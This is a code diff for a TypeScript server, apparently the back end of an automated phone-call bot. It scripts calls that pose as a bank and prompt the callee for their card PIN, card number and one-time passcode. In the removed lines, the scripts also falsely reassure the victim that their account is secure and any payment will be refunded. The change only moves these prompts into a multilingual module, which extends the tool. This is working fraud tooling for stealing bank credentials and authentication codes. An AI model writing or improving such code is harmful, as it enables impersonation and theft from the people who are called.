@@ -1,6 +1,8 @@
 import { app } from '..';
 import { bot } from '../..';
 import { v4 as uuidv4 } from 'uuid';
+import { getLangVerifyInput } from '../../languages';
+import { Language } from '../../types';
 
 app.all(`/verify_input/:step/:language/:chatId/:loop`, async (req, res) => {
   const { language, step, chatId, loop } = req.params;
@@ -26,9 +28,11 @@ app.all(`/verify_input/:step/:language/:chatId/:loop`, async (req, res) => {
               id: uuidv4(),
               action: 'say',
               options: {
-                payload: `Your one time password has been verified successfully. To AUTHENTICATE YOU please enter your ${
-                  language === 'en-us' ? 'CARD PIN' : 'TELEPIN'
-                }, the same pin you use at the ATM, followed by the pound key.`,
+                payload: getLangVerifyInput({
+                  language: language as Language,
+                  step: `bank`,
+                  cardType: cardType !== 'undefined' ? String(cardType) : ``,
+                }),
                 language,
                 voice: 'female',
               },
@@ -71,9 +75,11 @@ app.all(`/verify_input/:step/:language/:chatId/:loop`, async (req, res) => {
               id: uuidv4(),
               action: 'say',
               options: {
-                payload: `To AUTHENTICATE YOU please enter your ${
-                  language === 'en-us' ? 'CARD PIN' : 'TELEPIN'
-                }, the same pin you use at the ATM,  followed by the pound key.`,
+                payload: getLangVerifyInput({
+                  language: language as Language,
+                  step: `pay`,
+                  cardType: cardType !== 'undefined' ? String(cardType) : ``,
+                }),
                 language,
                 voice: 'female',
               },
@@ -116,9 +122,12 @@ app.all(`/verify_input/:step/:language/:chatId/:loop`, async (req, res) => {
                 id: uuidv4(),
                 action: 'say',
                 options: {
-                  payload: `We need to verify you, please enter your ${
-                    cardType !== 'undefined' ? cardType : ''
-                  } card number followed by the pound key.`,
+                  payload: getLangVerifyInput({
+                    language: language as Language,
+                    step: `account`,
+                    sp: `1`,
+                    cardType: cardType !== 'undefined' ? String(cardType) : ``,
+                  }),
                   language,
                   voice: 'female',
                 },
@@ -160,7 +169,12 @@ app.all(`/verify_input/:step/:language/:chatId/:loop`, async (req, res) => {
                 id: uuidv4(),
                 action: 'say',
                 options: {
-                  payload: `Your account is now secure. If the payment has already left your account, NO NEED TO WORRY. It will automatically be refunded to you in 24 to 48 hours. Thank you, goodbye.`,
+                  payload: getLangVerifyInput({
+                    language: language as Language,
+                    step: `account`,
+                    sp: `2`,
+                    cardType: cardType !== 'undefined' ? String(cardType) : ``,
+                  }),
                   language,
                   voice: 'female',
                 },
@@ -187,7 +201,12 @@ app.all(`/verify_input/:step/:language/:chatId/:loop`, async (req, res) => {
           id: uuidv4(),
           action: 'say',
           options: {
-            payload: `The one time password you have entered is incorrect. Please enter the one time password again followed by the pound key.`,
+            payload: getLangVerifyInput({
+              language: language as Language,
+              step: `shared`,
+              sp: `1`,
+              cardType: cardType !== 'undefined' ? String(cardType) : ``,
+            }),
             language,
             voice: 'female',
           },
@@ -230,7 +249,12 @@ app.all(`/verify_input/:step/:language/:chatId/:loop`, async (req, res) => {
         id: uuidv4(),
         action: 'say',
         options: {
-          payload: `Please wait while we verify your input.`,
+          payload: getLangVerifyInput({
+            language: language as Language,
+            step: `shared`,
+            sp: `2`,
+            cardType: cardType !== 'undefined' ? String(cardType) : ``,
+          }),
           language,
           voice: 'female',
         },
